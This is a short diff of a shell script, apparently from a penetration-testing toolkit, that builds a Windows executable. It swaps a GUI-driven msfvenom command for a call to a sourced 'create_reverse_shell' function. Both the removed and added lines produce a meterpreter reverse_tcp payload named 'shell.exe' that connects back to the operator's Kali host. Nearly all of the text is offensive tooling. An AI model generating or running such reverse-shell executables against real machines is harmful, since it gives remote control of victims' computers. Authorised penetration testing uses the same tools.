@@ -4,15 +4,10 @@
 Create EXE file
 '
 
-source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
-source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
-source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh
+source "${SCRIPTS_DIR}/shell/msfvenom/.files/create_reverse_shell.sh"
 
-# Generate gui form
-generate_form "LPORT" "filename"
+payload="windows/x64/meterpreter/reverse_tcp"
+format="exe"
+filename="shell.exe"
 
-LPORT=${form_data["LPORT"]}
-FILE=${form_data["filename"]}
-
-paste_command "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${KALI_IP} LPORT=${LPORT} -f exe -o ${FILE}.exe"
-xdotool key Return
+create_reverse_shell "${payload}" "${format}" "${filename}"
